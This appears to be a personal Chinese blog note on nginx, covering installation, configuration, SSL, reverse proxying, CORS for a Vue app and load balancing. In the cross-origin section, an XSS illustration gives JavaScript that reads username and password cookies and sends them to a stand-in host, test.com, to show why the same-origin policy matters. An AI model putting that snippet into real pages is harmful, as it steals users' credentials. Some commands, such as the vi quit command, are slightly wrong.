---
title: nginx
date: 2022-04-28 13:37:19
tags:
categories:
---





## install

https://www.digitalocean.com/community/tutorials/how-to-install-nginx-on-ubuntu-20-04







请求转发、反向代理、负载均衡

## command

```
nginx -s (signal)
```



```
nginx -s quit
nginx -s stop
nginx -s reload
```

Ps: 有时需要把进程杀死后才能reload





## 简单的图片服务器 

默认资源文件夹：`/var/www/html`

可自定义

看下面的server



在http模块下配置一个server即可



nginx.conf

```
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;

events {
	worker_connections 768;
	# multi_accept on;
}

http {

	##
	# Basic Settings
	##

	sendfile on;
	tcp_nopush on;
	tcp_nodelay on;
	keepalive_timeout 65;
	types_hash_max_size 2048;
	# server_tokens off;

	# server_names_hash_bucket_size 64;
	# server_name_in_redirect off;

	include /etc/nginx/mime.types;
	default_type application/octet-stream;

	##
	# SSL Settings
	##

	ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE
	ssl_prefer_server_ciphers on;

	##
	# Logging Settings
	##

	access_log /var/log/nginx/access.log;
	error_log /var/log/nginx/error.log;

	##
	# Gzip Settings
	##

	gzip on;

	# gzip_vary on;
	# gzip_proxied any;
	# gzip_comp_level 6;
	# gzip_buffers 16 8k;
	# gzip_http_version 1.1;
	# gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;

	##
	# Virtual Host Configs
	##

	include /etc/nginx/conf.d/*.conf;
	include /etc/nginx/sites-enabled/*;
	server{
		listen 80;
		server_name localhost;
		location  ~ .*\.(gif|jpg|jpeg|png)$ {
			root /home/cola/Downloads/;
		}	
	
	}
}


#mail {
#	# See sample authentication script at:
#	# http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript
# 
#	# auth_http localhost/auth.php;
#	# pop3_capabilities "TOP" "USER";
#	# imap_capabilities "IMAP4rev1" "UIDPLUS";
# 
#	server {
#		listen     localhost:110;
#		protocol   pop3;
#		proxy      on;
#	}
# 
#	server {
#		listen     localhost:143;
#		protocol   imap;
#		proxy      on;
#	}
#}
```





## 配置SSL

```
server {
    listen              80;
    server_name         120.24.111.127 homework.culiu-tech.com;
    rewrite ^(.*)$ https://homework.culiu-tech.com permanent;
}
server {
    listen              443 ssl;
    server_name         homework.culiu-tech.com;
    ssl_certificate      '/etc/nginx/certification/9462160_homework.culiu-tech.com.pem';
    ssl_certificate_key  '/etc/nginx/certification/9462160_homework.culiu-tech.com.key';
    location / {
       #some setting of moodle is in /yjdata/www/wwwroot/config.php
        proxy_pass      https://172.18.91.248:81;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header REMOTE-HOST $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}

```









# 概念



## 正向代理

`客户端client`与`代理服务器proxy`处于同一个局域网，就是正向代理
`服务器server`与`代理服务器proxy`处于同一局域网，就是反向代理



- 正向代理是代理客户端
- 反向代理是代理服务器



- 正向代理隐藏真实客户端

- 反向代理隐藏真实服务端

  



## 跨域

为什么会有跨域问题



首先，跨域说白了就是访问其他域名（区别于当前域名）的资源

那为什么不允许呢？

是因为浏览器为了保证安全而设置的同源策略/SOP（Same origin policy）



如果缺少了同源策略，浏览器很容易受到XSS、CSFR等攻击



举个例子：

假定有一个交流论坛

![image-20230201094007070](https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20230201094007070.png)



有用户在评价里写了恶意代码

那么，在其他用户浏览评论的时候就完蛋了

```js
var username=CookieHelper.getCookie('username').value;
var password=CookieHelper.getCookie('password').value;
var script =document.createElement('script');
script.src='http://test.com/index.php?username='+username+'&password='+password;
document.body.appendChild(script);
```

几句简单的javascript，获取cookie中的用户名密码，利用jsonp把向 [http://test.com/index.php](https://links.jianshu.com/go?to=http%3A%2F%2Ftest.com%2Findex.php)

发送了一个get请求





如果有了同源策略的话，这个请求就发不出去

防止了密码的泄露









##  Vue的跨域问题

本地环境下

![image-20230201141025695](C:\Users\10201\AppData\Roaming\Typora\typora-user-images\image-20230201141025695.png)



有些时候可能vue还在本地跑，但是Server是已经部署到公网了

这个时候访问网页就报跨域的问题了

因为browser有同源的限制

![image-20230201142415976](C:\Users\10201\AppData\Roaming\Typora\typora-user-images\image-20230201142415976.png)





那么解决跨域问题就需要代理服务器了

Ps：proxy服务器没有浏览器同源的限制

![image-20230201142609679](C:\Users\10201\AppData\Roaming\Typora\typora-user-images\image-20230201142609679.png)









## 负载均衡

![image-20230131154755265](C:\Users\10201\AppData\Roaming\Typora\typora-user-images\image-20230131154755265.png)







nginx.conf 位置：`/etc/nginx/`

日志位置：`/var/log/nginx/`

资源文件夹：`/var/www/html`



简单部署就安装了简易版的

```
apt-get update
```

```
sudo apt install nginx-light
```



```
	  server{
          listen 8080;
          location / {
            root   /var/www/html/dist/;
            try_files $uri $uri/ /index.html;
           }
           location /api {
             proxy_pass http://40.72.185.138:8082/;
           }
        }
```

root 为dis解压后的目录

proxy_pass 是后端api的地址

第二个location的意思是

把/api的请求

转到40.72.185.138:8082/



Ps：8082后加不加斜杠，取决于vue里面怎么拼接



```
!qa # 不保存退出vi
```



```
sudo nginx -s reload
```



卸载nginx

```
sudo apt-get remove nginx nginx-common
sudo apt-get purge nginx nginx-common
sudo apt-get autoremove
sudo apt-get remove nginx-full nginx-common
```







